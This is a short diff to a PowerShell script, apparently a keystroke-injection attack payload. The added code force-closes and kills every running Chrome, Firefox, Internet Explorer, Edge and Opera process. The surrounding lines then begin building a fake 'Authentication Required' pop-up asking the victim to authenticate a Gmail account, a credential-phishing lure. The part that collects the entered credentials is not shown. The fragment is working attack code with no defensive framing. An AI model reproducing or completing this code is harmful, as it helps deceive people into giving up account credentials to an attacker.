@@ -75,6 +75,16 @@ Pause-Script
 
 Caps-Off
 
+$browserProcesses = "chrome", "firefox", "iexplore", "edge", "opera"
+
+$browserProcesses | ForEach-Object {
+    Get-Process -Name $_ -ErrorAction SilentlyContinue | ForEach-Object {
+        $_.CloseMainWindow()
+        if (!$_.HasExited) { $_.Kill() }
+    }
+}
+
+
 Add-Type -AssemblyName PresentationCore,PresentationFramework
 $msgBody = "Please authenticate your Gmail Account."
 $msgTitle = "Authentication Required"
